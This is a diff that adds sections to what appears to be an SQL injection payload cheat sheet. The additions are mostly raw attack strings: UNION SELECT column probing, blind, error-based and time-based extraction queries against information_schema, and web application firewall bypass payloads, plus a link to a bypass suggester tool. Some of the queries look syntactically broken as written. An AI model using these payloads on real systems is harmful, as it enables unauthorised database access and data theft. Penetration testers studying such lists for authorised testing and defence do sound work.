@@ -68,7 +68,39 @@ SQLite
                         #-1' UNION SELECT 1,2,3--+    True
 ```
 
+### **UNION SELECT**
+```
+1' UNION SELECT null-- - Not working
+1' UNION SELECT null,null-- - Not working
+1' UNION SELECT null,null,null-- - Worked
+```
 
+### **Exploiting Blind SQLi**
+```
+?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
+```
+
+### **Exploiting Error Blind SQLi**
+```
+AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
+```
+
+### **Exploiting Time Based SQLi**
+```
+1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
+```
+
+### **WAF bypass**
+```
+-1' or 1.e(1) or '1'='1
+-1' or 1337.1337e1 or '1'='1
+' or 1.e('')=
+```
+
+### **WAF bypass suggester tools**
+```
+https://github.com/m4ll0k/Atlas
+```
 
 
 
